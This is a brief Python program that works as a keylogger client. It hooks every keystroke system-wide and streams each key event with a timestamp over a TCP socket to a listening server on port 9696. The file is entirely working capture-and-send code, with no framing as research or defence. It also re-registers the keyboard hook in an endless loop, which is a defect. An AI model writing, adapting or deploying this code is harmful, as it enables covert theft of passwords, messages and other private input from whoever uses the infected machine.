from datetime import datetime
import keyboard, threading, socket, time


class keyboardclient:
    def __init__(self):
        self.MLEN = 25565
        self.__networkinit()

    def __networkinit(self):
        host = '127.0.0.1'
        port = 9696
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((host, port))
        receive_thread = threading.Thread(target=self.handle_data)
        receive_thread.start()

    def sendkey(self, keys):
        timestamp = datetime.utcnow().strftime('%Y-%m-%d-%H-%M-%S')
        feedbacks = str(keys)[14:-1] + "   " + str(timestamp)
        self.client.send(feedbacks.encode())
        # print(keys, type(keys))

    def handle_data(self):
        while True:
            keyboard.hook(lambda x: self.sendkey(x))
            time.sleep(10)


def main():
    k = keyboardclient()


if __name__ == '__main__':
    main()
